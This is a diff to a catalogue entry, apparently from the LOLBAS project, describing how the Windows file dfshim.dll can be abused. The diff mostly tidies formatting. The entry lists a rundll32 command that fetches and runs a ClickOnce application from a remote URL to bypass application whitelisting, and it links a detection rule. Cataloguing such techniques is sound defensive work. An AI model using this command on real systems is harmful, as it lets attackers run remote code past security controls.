@@ -1,11 +1,11 @@
 ---
 Name: Dfshim.dll
 Description: ClickOnce engine in Windows used by .NET
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
-    Description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
+  - Command: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
+    Description: Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)
     Usecase: Use binary to bypass Application whitelisting
     Category: AWL Bypass
     Privileges: User
@@ -19,8 +19,6 @@ Full_Path:
   - Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
   - Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
   - Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
 Resources:
